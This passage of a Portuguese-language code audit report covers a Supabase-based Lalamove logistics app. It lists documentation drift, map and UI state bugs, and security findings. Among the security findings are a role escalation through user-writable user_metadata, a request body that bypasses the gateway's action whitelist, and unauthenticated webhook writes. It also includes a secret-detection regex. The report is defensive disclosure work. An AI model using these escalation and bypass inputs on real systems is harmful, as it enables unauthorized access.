  docs/CRON_JOBS.md:43-47 lista `refresh-cache-views` (apontando para a função inexistente `public.refresh_cache_views()`), `refresh-driver-stats-cache`, `refresh-delivery-hourly-stats` e `refresh-risk-distribution` como ativos. As duas últimas só existem em supabase/migrations/20251226020000_create_materialized_views_cache.sql:356-367, arquivo cujo DDL nunca rodou (20261123110000_cron_refresh_cache_views.sql:3-7), e suas views-alvo só são criadas no mesmo arquivo (:122, :147). `refresh-driver-stats-cache` também é agendado por 20251226000004_create_cache_views.sql:349-353 e sua view existe (20261122090000_cache_system_backend.sql:20).
  ```
- **Causa raiz:** O documento de cron foi escrito a partir dos arquivos de migration, não de `cron.job`, e incluiu agendamentos de um arquivo que o próprio repositório identifica como não aplicado. Se por algum caminho esses jobs existirem no banco, eles falham a cada execução por referenciarem relações inexistentes.
- **Arquivos:** `docs/CRON_JOBS.md`, `supabase/migrations/20251226020000_create_materialized_views_cache.sql`, `supabase/migrations/20261123110000_cron_refresh_cache_views.sql`, `supabase/migrations/20261122090000_cache_system_backend.sql`
- **Etapas do plano:** 160
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Acesso de leitura ao banco oficial iecgydonctmabiijadsf (nenhum MCP desta sessão aponta para ele): basta `select jobname, schedule, active from cron.job order by jobname` e `select matviewname from pg_matviews where schemaname='public'` para dizer quais dos quatro jobs de cache realmente existem e contra quais views.

#### B-007 — mapa-repo.md afirma que nenhum doc e gerado por script e que vários scripts tem service_role/PAT no codigo; as duas afirmacoes sao falsas hoje

- **Camada:** Documentação × código
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Duas perdas concretas. Primeira: o agente edita a mao um doc que e regerado por workflow e o trabalho e sobrescrito na proxima execucao. Segunda: o aviso de "segredo no codigo" faz o agente desviar de scripts que hoje sao a ferramenta certa (os guards de scripts/ci/ sao o que o CI roda e barra o merge), ou repetir ao dono um risco de seguranca que ja foi corrigido.
- **Evidência:**
  ```
  docs/agentes/mapa-repo.md:21-23 refere-se aos docs da tabela :7-19 (nenhum gerado por script — afirmação válida); a parte falsa é só :44 "Vários têm service_role/PAT no código", contra `grep -rlE "eyJ[A-Za-z0-9_-]{10,}|sbp_[A-Za-z0-9]{20,}" scripts/` = apenas scripts/pre-commit-secrets.sh (regex do detector) e scripts/ai-context/cenarios.mjs (fixture), com scripts/list-tables.ts:8 e scripts/apply-sql-via-management-api.ts:6 lendo process.env e banco.md:68-81 registrando a PR #80. `find scripts -maxdepth 1 -type f | wc -l` = 29, confirmando o "30 scripts soltos".
  ```
- **Causa raiz:** Dois fatos mudaram depois de 08/11 e o mapa nao acompanhou: nasceram dois workflows que geram documentacao automaticamente, e a PR #80 trocou todos os segredos hardcoded de scripts/ por leitura de process.env (banco.md:71-81 ja registra isso). A pasta scripts/ tambem deixou de ser "30 scripts soltos": sao 182 arquivos, com subpastas organizadas (scripts/ci/ com ~30 guards e README, scripts/inventario/, scripts/ai-context/, scripts/graphify/).
- **Arquivos:** `docs/agentes/mapa-repo.md`, `.github/workflows/contexto.yml`, `.github/workflows/inventario-estado-semanal.yml`, `scripts/ci/README.md`, `scripts/inventario/README.md`
- **Etapas do plano:** 162

#### B-024 — `geo-admin` ficou fora do registro de contratos, mas o doc afirma "26 de 26 Edge Functions com entrada validada"

- **Camada:** Integrações e contratos
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A função que troca a credencial paga do Mapbox é a única sem a camada de validação padrão, e a documentação diz que todas estão cobertas — quem confia no doc para auditar não vai olhar para ela.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/_shared/schemas.ts:983-1010 → `CONTRACT_REGISTRY` lista 26 nomes e não inclui `geo-admin`  ·  /home/user/Lalamove_V2/supabase/functions/geo-admin/index.ts:86-92 → `let body: { action?: string; note?: string; dry_run?: boolean; token_id?: string } = {}; try { body = await req.json(); } catch { return json({ error: "Invalid JSON" }, 400); }`  ·  /home/user/Lalamove_V2/docs/API_CONTRACTS.md → `**26 de 26** Edge Functions com entrada validada pela camada.` e a tabela "Status de integração" sem linha para `geo-admin`
  ```
- **Causa raiz:** A tabela de status e o contador do doc foram escritos quando havia 26 funções; `geo-admin` entrou depois (rotação do token de servidor Mapbox via Tokens API) e nunca foi adicionada ao `CONTRACT_REGISTRY` nem às fixtures. O teste que "falha se o registro deixar de cobrir 26 contratos" não protege contra isso: ele trava o número 26, então uma função nova fora do registro continua passando. Resultado: a única edge que cunha e revoga credenciais de faturamento valida a entrada à mão (sem Zod, sem o 422 do formato único) e `body.action` segue como string livre comparada por igualdade em :117.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/_shared/schemas.ts`, `/home/user/Lalamove_V2/supabase/functions/geo-admin/index.ts`, `/home/user/Lalamove_V2/docs/API_CONTRACTS.md`
- **Etapas do plano:** 206

#### B-039 — Dois pares de crons agendam a mesma rotina com nomes diferentes, e o documento descreve cada par como rotinas distintas

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Duas execuções diárias e duas semanais fazendo exatamente o mesmo trabalho — a segunda não apaga nada, só gasta execução e polui o histórico de cron e a tabela de logs, dificultando ler o painel de saúde dos jobs.
- **Evidência:**
  ```
  Par 1: supabase/migrations/20260109205309_5747a020-5d75-4401-a623-b5688143f754.sql:157-162 → `SELECT cron.schedule('daily-cleanup-tokens-and-attempts', '0 3 * * *', $$SELECT public.run_daily_cleanup_with_logging()$$);` e supabase/migrations/20260712202307_d4575c89-bdd8-439f-92bc-3d5524309049.sql:13-17 → `SELECT cron.schedule('daily-cleanup-with-logging', '45 3 * * *', $$ SELECT public.run_daily_cleanup_with_logging(); $$);` — mesma função, dois jobnames, 45 min de diferença. Par 2: 20260109205309:164-169 → `SELECT cron.schedule('weekly-cleanup-cron-logs', '0 4 * * 0', $$SELECT public.cleanup_old_cron_logs()$$);` e 20260712202307:20-24 → `SELECT cron.schedule('cleanup-old-cron-logs', '15 4 * * 0', $$ SELECT public.cleanup_old_cron_logs(); $$);`. O doc trata os pares como coisas diferentes: docs/CRON_JOBS.md:60-61 → `daily-cleanup-tokens-and-attempts` "Tokens de reset expirados, tentativas de login antigas" e `daily-cleanup-with-logging` "Igual acima, com log em cron_job_logs" — mas os dois chamam a variante *_with_logging; e :65-66 lista `cleanup-old-cron-logs` e `weekly-cleanup-cron-logs` como rotinas separadas.
  ```
- **Causa raiz:** A migration de 12/07 agendou "as rotinas que existiam sem cron job associado" (20260712202307:1) sem verificar que a de 09/01 já as havia agendado com outro nome; o `cron.unschedule` de cada arquivo só protege contra o próprio nome.
- **Arquivos:** `supabase/migrations/20260109205309_5747a020-5d75-4401-a623-b5688143f754.sql`, `supabase/migrations/20260712202307_d4575c89-bdd8-439f-92bc-3d5524309049.sql`, `docs/CRON_JOBS.md`
- **Etapas do plano:** 259

#### B-050 — docs/DATA_DICTIONARY.md diverge do schema em cinco pontos, inclusive na escala do score de risco

- **Camada:** Banco — integridade e índices
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Quem usa o dicionário para interpretar relatório de risco erra por um fator de 10: um motorista com score 8 (risco alto na escala real) é lido como 'risco baixo, 8 de 100'. E quem programa contra o documento escreve filtros por status e tipo de alerta que nunca retornam nada.
- **Evidência:**
  ```
  docs/DATA_DICTIONARY.md:10 `- "risk_score": Pontuação de risco (0-100, onde 100 é risco máximo)` e :11 `- "status": Estado atual (ACTIVE, BLOCKED, PENDING_APPROVAL)` contra supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:87 `risk_score DECIMAL(3,1) DEFAULT 5.0 CHECK (risk_score >= 0 AND risk_score <= 10),` e :25-32 `CREATE TYPE public.driver_status AS ENUM ('APPROVED','PENDING_APPROVAL','BLOCKED','WHITELIST','BLACKLIST');`; src/integrations/supabase/types.ts:3171 `Relationships: []` (tracking_events) e :4749-4765 (15 valores de alert_type, nenhum RISK/DELAY/DEVIATION/SECURITY).
  ```
- **Causa raiz:** O dicionário foi escrito no começo do projeto e não acompanhou nem as migrations nem a geração de tipos; nenhuma das migrations que mudaram enum, CHECK ou FK atualizou o arquivo no mesmo PR, como a regra do AGENTS.md pede.
- **Arquivos:** `docs/DATA_DICTIONARY.md`, `supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql`, `src/integrations/supabase/types.ts`, `supabase/functions/evaluate-driver/index.ts`
- **Etapas do plano:** 287

#### B-057 — Doc e teste de integração afirmam um gate de IP no webhook da Lalamove que o código só registra em log — e o teste passa por acaso

- **Camada:** Integrações e contratos
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A documentação de segurança descreve duas barreiras no recebimento dos avisos da Lalamove quando só existe uma. Quem auditar o sistema vai concluir que há uma proteção de origem que não há, e o teste que deveria avisar não avisa.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/lalamove-webhook/index.ts:152-154 → `if (!isIpTrusted(clientIp)) { logger.warn(\`[Webhook] IP fora das faixas conhecidas: ${clientIp} — seguindo (autenticacao via assinatura)\`); }`  ·  /home/user/Lalamove_V2/supabase/functions/_shared/contract.integration.test.ts:243-258 → `Deno.test("[I/O][lalamove-webhook] gate de IP rejeita origem não confiável (403)", ... assert([401, 403].includes(res.status), ...)`  ·  /home/user/Lalamove_V2/docs/API_CONTRACTS.md → `**Segurança** — o gate de IP do \`lalamove-webhook\` precede o contrato (403 para origem não confiável)` e, na tabela, `lalamove-webhook | ✅ | + validação HMAC e gate de IP antes do contrato`
  ```
- **Causa raiz:** O bloqueio por faixa de IP foi removido de propósito (o comentário explica que a Lalamove não publica os ranges do mercado BR e o 403 derrubava o registro da URL), mas o doc e o nome do teste não acompanharam. O teste continua verde porque aceita `[401, 403]` e o payload sem assinatura válida recebe 401 do HMAC — ele afirma testar origem e está medindo assinatura. `TRUSTED_IP_PATTERNS` (:36-39) e `isIpTrusted` (:56-64) ficaram como código sem efeito sobre a decisão.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/lalamove-webhook/index.ts`, `/home/user/Lalamove_V2/supabase/functions/_shared/contract.integration.test.ts`, `/home/user/Lalamove_V2/docs/API_CONTRACTS.md`
- **Etapas do plano:** 294

#### B-059 — docs/pendencias/P-10 contradiz o codigo atual e o AGENTS.md sobre chaves em scripts/ e sobre a rotacao

- **Camada:** Transversal — segurança
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Dois documentos de regra dizem coisas diferentes sobre o mesmo assunto: um afirma que as chaves ja foram trocadas, o outro que a troca esta pendente. Quem for decidir se ainda ha risco ativo (ou qualquer agente de IA que leia as pastas) parte de informacao errada e ou gasta tempo com problema ja resolvido ou deixa de rotacionar o que precisa.
- **Evidência:**
  ```
  docs/pendencias/P-10-scripts-chaves-legacy.md:8 '- ~12 scripts de diagnóstico restantes ainda têm chaves legacy hardcoded (anon ...Us06x... e service_role ...EvEAz... — todas 401 após rotação).' e :11 '- Manter os scripts de diagnóstico como estão: sem referência ativa, sem regressão funcional.' Contra: scripts/list-tables.ts:7-11 "const SUPABASE_URL = 'https://iecgydonctmabiijadsf.supabase.co'; const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY; if (!SUPABASE_SERVICE_ROLE_KEY) { console.error('Defina SUPABASE_SERVICE_ROLE_KEY no ambiente antes de rodar este script.'); process.exit(1); }". E AGENTS.md:28-30 '**a rotação das chaves e a confirmação de que a edge saiu da produção seguem pendentes com o dono**'.
  ```
- **Causa raiz:** A pendencia foi escrita antes da limpeza (branch claude/fix-segredos-commitados-261108-2105) e nao foi fechada no mesmo PR do fix, contrariando a regra do proprio AGENTS.md ('divergiu da realidade -> corrija no mesmo PR do fix').
- **Arquivos:** `docs/pendencias/P-10-scripts-chaves-legacy.md`, `AGENTS.md`, `scripts/list-tables.ts`, `scripts/list-tables-v2.ts`, `scripts/test-user-permissions.ts`, `scripts/apply-dashboard-fixes.ts`, `scripts/seed-database.ts`
- **Etapas do plano:** 296


## Causa raiz: O que está desenhado no mapa e nos painéis não é reconciliado com o que mudou

Os elementos do mapa e dos painéis foram criados supondo uma tela estática. Quando o pedido sai do acompanhamento, o marcador é removido mas o traçado da rota fica desenhado para sempre; a cada ciclo de atualização o balão de informações do motorista é recriado e fecha sozinho na cara do operador; abrir o painel de configurações do mapa recarrega os valores padrão e apaga os limites que o operador acabou de ajustar; e ao abrir o histórico de dois motoristas em sequência, a resposta atrasada do primeiro sobrescreve a do segundo. São falhas de limpeza e de ordem, não de cálculo: o que a tela mostra deixa de corresponder ao que está acontecendo.

**4 achado(s) sob esta causa.**


#### M-069 — Abrir o painel de configurações do mapa zera os limiares de alerta que o operador acabou de ajustar

- **Camada:** Interface — mapa e rastreamento (+ 1 outro(s) local)
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O operador ajusta os limites de 'fora de rota', 'parado' e cerca do mapa, fecha o painel e, ao reabrir, tudo volta ao padrão — os alertas do mapa passam a usar valores que ninguém escolheu.
- **Evidência:**
  ```
  src/components/map/MapSettingsPanel.tsx:34-39 `useEffect(() => {` / `if (show && activeContext) {` / ... / `await loadContextSettings(activeContext);`; src/hooks/useMapSettings.ts:107-110 `} else {` / `// Fallback to defaults if no specific context found` / `get().resetToDefaults();` / `}`; useMapSettings.ts:119-123 `resetToDefaults: () => set({ offRouteThreshold: 500, ... })`
  ```
  Mesma causa, outro local — Hooks e estado — auth, permissão e infra:
  ```
  src/hooks/useMapSettings.ts:107-110 `} else { // Fallback to defaults if no specific context found` / `get().resetToDefaults(); }` · :119-123 `resetToDefaults: () => set({ offRouteThreshold: 500, stoppedThreshold: 15, geofenceRadius: 300, })` || src/components/map/MapSettingsPanel.tsx:34-39 `useEffect(() => { if (show && activeContext) { ... await loadContextSettings(activeContext);` || src/components/map/LiveMap.tsx:559 `<MapSettingsPanel show={showSettings} onClose={() => setShowSettings(false)} />` (sem activeContext → sempre 'default')
  ```
- **Causa raiz:** O painel chama `loadContextSettings('default')` toda vez que abre (`activeContext` tem default 'default', MapSettingsPanel.tsx:15). Se não existe linha salva em `map_settings_overrides` para esse contexto — o caso normal, porque salvar depende de o usuário clicar em Salvar (linha 53) — o store executa `resetToDefaults()` e sobrescreve offRouteThreshold/stoppedThreshold/geofenceRadius com 500/15/300, descartando o que estava persistido no localStorage pelo zustand (useMapSettings.ts:43-50, 119-123). O mesmo reset acontece no `catch` (linha 114).
- **Arquivos:** `src/components/map/LiveMap.tsx`, `src/components/map/MapSettingsPanel.tsx`, `src/hooks/useMapSettings.ts`
- **Etapas do plano:** 151

#### M-070 — Traçado de rota fica no mapa para sempre depois que o pedido sai do rastreamento

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Ao longo do turno o mapa vai acumulando linhas de entregas já encerradas; o operador vê rotas que não existem mais e a tela fica cada vez mais pesada até ele recarregar a página.
- **Evidência:**
  ```
  src/components/map/hooks/useMapMarkers.ts:157-164 `driverMarkers.current.forEach((marker, id) => {` / `  if (!currentIds.has(id)) {` / `    marker.remove();` / `    driverMarkers.current.delete(id);` — e :231 `const sourceId = \`route-${tracking.id}\`;` com :234 `routeLines.current.add(tracking.id);`
  ```
- **Causa raiz:** A reconciliação remove marcador e posição do motorista que saiu de `trackingData`, mas não remove a source/layer `route-<id>` nem o id do Set `routeLines`. Busca no diretório confirma que não existe nenhum `removeLayer`/`removeSource` para ids `route-` (só geofence, overlay raster e a linha de histórico são removidos: mapLayers.ts:291-292, LiveMap.tsx:199-201, LiveMap.tsx:349-350). `resetMarkers` (useMapMarkers.ts:112-121) limpa refs mas não apaga as camadas do mapa.
- **Arquivos:** `src/components/map/hooks/useMapMarkers.ts`
- **Etapas do plano:** 152

#### M-108 — useTrackingHistory sem proteção contra resposta atrasada: histórico de um motorista pode sobrescrever o de outro

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O painel de histórico pode mostrar o trajeto de um motorista com o nome de outro, sem erro visível — base errada para cobrar atraso ou apurar incidente.
- **Evidência:**
  ```
  src/hooks/useTrackingHistory.ts:46-52 `const { data, error: fetchError } = await query;` ... `setHistory(data || []);` sem guarda de requisição corrente; disparo em src/components/map/LiveMap.tsx:340-341 `setShowHistoryFor(e.detail); fetchHistory(e.detail.driverId, e.detail.orderId, 200);`
  ```
- **Causa raiz:** `fetchHistory` é chamado a cada evento `show-driver-history` vindo do mapa, sem cancelar nem marcar como obsoleta a chamada anterior. Abrindo o histórico do motorista A e logo depois o do B, a resposta de A (até 200 pontos de `tracking_events`) pode chegar por último e sobrescrever `history`, deixando o painel com o nome de B e o trajeto de A. O hook vizinho já resolve isso: src/components/map/hooks/useTrackingData.ts:51 `let cancelled = false;` com `if (cancelled) return;` antes do setState.
- **Arquivos:** `src/hooks/useTrackingHistory.ts`, `src/components/map/LiveMap.tsx`
- **Etapas do plano:** 224

#### M-110 — Balão de informações do motorista fecha sozinho a cada ciclo de atualização

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Ao abrir os detalhes de um motorista no mapa, a janelinha fecha sozinha em poucos segundos; o operador precisa clicar de novo cada vez que quer ler endereço, cliente e ETA.
- **Evidência:**
  ```
  src/components/map/hooks/useMapMarkers.ts:184-186 `if (existingDriverMarker.getPopup()?.isOpen()) {` / `  existingDriverMarker.setPopup(createDriverPopup(tracking));` / `}` + node_modules/mapbox-gl/dist/mapbox-gl-dev.js:113229-113231 `if (this._popup) { this._popup.remove(); this._popup = null;`
  ```
- **Causa raiz:** O código troca o popup justamente quando ele está aberto, para atualizar os dados. Mas `Marker.setPopup` do mapbox-gl remove o popup atual (fecha) e associa o novo fechado — não há reabertura. Como `trackingData` é refeito a cada 5 s (useTrackingData.ts:102) e a cada evento realtime, o balão que o operador está lendo fecha nesse intervalo.
- **Arquivos:** `src/components/map/hooks/useMapMarkers.ts`
- **Etapas do plano:** 226


## Causa raiz: A coordenada do endereço não acompanha o endereço escolhido no pedido

No formulário de novo pedido, só um dos caminhos de escolha de endereço avisa o formulário sobre o ponto no mapa. Se o operador escolhe o endereço no autocompletar e depois usa o preenchimento por CEP, o texto muda mas a coordenada antiga permanece; se escolhe um endereço do CRM ou da lista de "já usados", o endereço entra sem a coordenada que o sistema já tinha guardada. Em qualquer dos dois casos a cotação e o pedido saem com o ponto errado no mapa, o que significa preço errado e motorista indo ao lugar errado — sem nenhum aviso na tela.

**2 achado(s) sob esta causa.**


#### A-063 — Buscar o endereco pelo CEP depois de escolher no autocomplete deixa a coordenada antiga: a cotacao vai com o ponto do endereco anterior

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A Lalamove cobra e roteiriza pela coordenada, nao pelo texto: o pedido sai com o endereco novo escrito na tela e o ponto do endereco velho. Preco errado e motorista indo para o lugar errado, sem nenhum aviso ao operador.
- **Evidência:**
  ```
  src/components/orders/NewOrderDialog.tsx:645 `onResolved={(formatted) => updateField('pickupAddress', formatted)}` e :712 `onResolved={(formatted) => updateField('deliveryAddress', formatted)}` | :651-653 `if (pickupGeo && val !== pickupGeo.formatted) setPickupGeo(null);` | :313 `{ address: form.pickupAddress.trim(), ...stopCoordinates(pickupGeo) },` | src/components/orders/AddressAutocomplete.tsx:109-112 `useEffect(() => { ... setInputValue(value); }, [value]);` (nao dispara onChange)
  ```
- **Causa raiz:** A limpeza da coordenada esta so no onChange do AddressAutocomplete. O CepQuickFill escreve o endereco direto via updateField (mesmo caminho nas duas pontas: :642-646 coleta e :709-713 entrega), entao o texto muda e `pickupGeo`/`deliveryGeo` continuam apontando para o endereco escolhido antes.
- **Arquivos:** `src/components/orders/NewOrderDialog.tsx`, `src/components/orders/CepQuickFill.tsx`
- **Etapas do plano:** 239

#### M-115 — Endereco escolhido no CRM ou em 'Ja usados' entra no pedido sem a coordenada que o sistema ja tinha gravada

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A lista 'Ja usados' existe justamente para reaproveitar o ponto exato sem pagar nova consulta ao provedor de mapas, mas o pedido sai so com o texto e a Lalamove refaz a localizacao por conta propria — pode cair em outro ponto da mesma rua, e o ganho de custo e de precisao nao acontece.
- **Evidência:**
  ```
  src/components/orders/AddressAutocomplete.tsx:124-130 (handleSelectCRM, sem canal de geo) e :175-190 (`if (onSelectMapbox || onCoordinatesChange)` com `onCoordinatesChange?.(item.latitude, item.longitude)`); src/components/orders/NewOrderDialog.tsx:647-658 e :714 montam o componente sem `onSelectMapbox`/`onCoordinatesChange`; src/hooks/useGeoSearch.ts:242 garante que todo endereço frequente tem lat/lng; AddressAutocomplete.tsx:249 `onClick={() => handleSelectFrequent(item)}`
  ```
- **Causa raiz:** Somente `handleSelectMapbox` chama `onAddressSelected` (:145), que e o unico canal que o formulario de pedido escuta. Como o dialogo nao passa `onSelectMapbox`/`onCoordinatesChange`, o bloco condicional de `handleSelectFrequent` nunca executa e a latitude/longitude ja armazenada do endereco frequente e descartada; a selecao no CRM nunca teve canal nenhum.
- **Arquivos:** `src/components/orders/AddressAutocomplete.tsx`, `src/components/orders/NewOrderDialog.tsx`
- **Etapas do plano:** 231


## Backend — demais edges

**1 achado(s).**


#### B-041 — simulate-driver-movement: o botão "Simular" do mapa ao vivo sempre falha em produção e mostra mensagem de permissão errada

- **Camada:** Backend — demais edges
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um botão visível no mapa ao vivo nunca funciona em produção e acusa falta de permissão mesmo para o administrador, fazendo o dono achar que é problema de cadastro de acesso quando é um recurso que só existe em desenvolvimento.
- **Evidência:**
  ```
  supabase/functions/simulate-driver-movement/index.ts:70-72 (403 de ambiente) e :95 (403 de papel); src/pages/LiveMapPage.tsx:103 mapeia 403 para a mensagem de papel; botão sem gate de ambiente em src/pages/LiveMapPage.tsx:228-241; rota viewer em src/App.tsx:190.
  ```
- **Causa raiz:** A edge devolve 403 tanto para "não é ambiente de desenvolvimento" quanto para "papel insuficiente", e o front mapeia todo 403 para a mensagem de papel. Em produção o primeiro gate sempre dispara, então o botão existe na tela de nível `viewer` (src/App.tsx:190, rota /live-map) e, para qualquer um que clique — inclusive um admin legítimo —, o sistema diz que falta permissão quando na verdade a função está desligada por ambiente de propósito.
- **Arquivos:** `supabase/functions/simulate-driver-movement/index.ts`, `src/pages/LiveMapPage.tsx`
- **Etapas do plano:** 261


## Backend — edges Lalamove

**6 achado(s).**


#### C-006 — requireAdmin da lalamove-uapi aceita papel escrito pelo proprio usuario (escalonamento) e nunca reconhece o admin de verdade

- **Camada:** Backend — edges Lalamove (+ 2 outro(s) local)
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Dois estragos ao mesmo tempo. Qualquer pessoa com login consegue, mudando um dado do proprio perfil, sobrescrever a sessao do portal Lalamove da empresa — derrubando carteira, historico e cupons de todos — e ler os metadados do token. E o administrador legitimo nao consegue trocar o token quando ele expira, o que transforma uma tarefa de 1 minuto em incidente.
- **Evidência:**
  ```
  supabase/functions/lalamove-uapi/index.ts:87-89; supabase/functions/external-companies/index.ts:43-48; nenhuma escrita de app_metadata em todo o repo (grep em supabase/migrations/, supabase/functions/, src/); fonte real do papel em supabase/migrations/20251231115949_817e6539-79a0-43fd-98e6-e7bb705cf1b2.sql:137-149 (has_role com is_active).
  ```
  Mesma causa, outro local — Transversal — segurança:
  ```
  supabase/functions/lalamove-uapi/index.ts:87 — 'const role = claimsData.claims.app_metadata?.role ?? claimsData.claims.user_metadata?.role;' seguido de :88 'if (role !== \'admin\') {' → 403. Mesma linha em supabase/functions/external-companies/index.ts:43, seguida de :44-45 'const level = ROLE_PRIORITY[role] ?? 0; if (level < ROLE_PRIORITY.operator) {'. Prova da gravabilidade: src/pages/ProfilePage.tsx:77-79 'await supabase.auth.updateUser({ data: { full_name: trimmedName, name: trimmedName } })'.
  ```
  Mesma causa, outro local — Backend — demais edges:
  ```
  supabase/functions/external-companies/index.ts:43-47 — `const role = claimsData.claims.app_metadata?.role ?? claimsData.claims.user_metadata?.role; const level = ROLE_PRIORITY[role] ?? 0; if (level < ROLE_PRIORITY.operator) { ... 403 ... }`; supabase/functions/lalamove-uapi/index.ts:87-89 — mesma leitura com `if (role !== 'admin')`. Gate correto já no repo: supabase/functions/geo-admin/index.ts:74-83.
  ```
- **Causa raiz:** O check le o papel de claims do JWT. `app_metadata` nunca e populado por nenhuma migration, funcao ou trigger deste repo, entao o primeiro termo e sempre `undefined` e o fallback assume: `user_metadata` (raw_user_meta_data), que o proprio usuario grava do navegador com `supabase.auth.updateUser({ data: { role: 'admin' } })` e que entra no token no refresh seguinte. Resultado duplo: quem nao e admin consegue virar admin aos olhos da funcao, e quem e admin de fato (linha em user_roles) e barrado com 403.
- **Arquivos:** `src/hooks/usePermissions.ts`, `src/hooks/useRole.ts`, `supabase/functions/external-companies/index.ts`, `supabase/functions/lalamove-uapi/index.ts`
- **Etapas do plano:** 011

#### M-012 — O webhook grava no banco antes de qualquer autenticacao valida, com limite de requisicoes guardado so na memoria do processo e sem politica de retencao

- **Camada:** Backend — edges Lalamove
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa na internet, sem login, consegue inflar a tabela de eventos do webhook e o consumo de banco — aumentando a conta e enchendo a tela de eventos de lixo, ate o ponto de esconder um evento real no meio. Nao ha perda de dado, mas ha custo e ruido operacional.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts:207-212 (insert antes da autenticacao) · :31-33 e :65 (rate limit em memoria) · :146 e :152-154 (chave por cabecalho do cliente; IP so loga) · ausencia de retencao: nenhuma `DELETE FROM public.webhook_events` em supabase/migrations/, so a policy em 20260108144121_*.sql:412
  ```
- **Causa raiz:** A funcao e publica por necessidade (`verify_jwt = false` no config.toml, correto para webhook) e a autenticidade e garantida pela assinatura — mas a escrita de auditoria acontece ANTES de o remetente ter provado qualquer coisa, com service_role. As duas contencoes que existiriam nao contem: o Map vive no isolate (reinicia a cada cold start e nao e compartilhado entre instancias) e a chave e um cabecalho que o cliente escolhe. Sem retencao, cada requisicao recusada deixa residuo permanente de ate 1000 caracteres.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`, `supabase/config.toml`
- **Etapas do plano:** 050
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Nao tenho acesso ao banco de producao (nenhum MCP desta sessao aponta para iecgydonctmabiijadsf): falta `select count(*), min(created_at) from webhook_events where event_type = 'SIGNATURE_INVALID'` para saber se ja existe acumulo real, e a contagem total da tabela para dimensionar o custo.

#### M-013 — lalamove-gateway deixa o chamador sobrescrever a action roteada via params, furando a propria lista branca de acoes

- **Camada:** Backend — edges Lalamove
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A unica lista de 'o que pode ser chamado pelo app' deixa de valer. Um pedido montado a mao pelo navegador alcanca operacoes que o gateway foi escrito justamente para nao expor, e os relatorios de uso mostram a acao errada — entao o abuso nao aparece na telemetria.
- **Evidência:**
  ```
  supabase/functions/lalamove-gateway/index.ts:294-301 (set('action') antes do loop de params) e :277-281 (mesmo padrão com 'key'); supabase/functions/lalamove-gateway/route.ts:54-61 (translateParams não filtra chave reservada); supabase/functions/_shared/schemas.ts:534-545 (params livre); supabase/functions/lalamove-api/index.ts:681-698 (query tem precedência sobre corpo). Contraprova do enquadramento: lalamove-api/index.ts sem qualquer check de papel + src/components/orders/NewOrderDialog.tsx:302 invocando lalamove-api direto.
  ```
- **Causa raiz:** A action de destino e escrita na query string antes do loop que copia os `params` do chamador, e `URLSearchParams.set` substitui. Com `{"action":"cities","params":{"action":"set-webhook"}}` o gateway acredita ter roteado para `cities` (telemetria, alertas e logs registram 'cities') mas a URL final chama `set-webhook` na lalamove-api. Isso anula tudo que a tabela de rotas tenta impedir: as acoes marcadas `unsupported` (route.ts:113-140 — passagem generica v3/uapi e escrita de credencial) e as acoes de lalamove-api que nem estao na tabela (set-webhook, edit-order, change-driver, fetch-orders-bulk, webhook-selftest, priority-fee).
- **Arquivos:** `supabase/functions/lalamove-gateway/index.ts`, `supabase/functions/lalamove-gateway/route.ts`
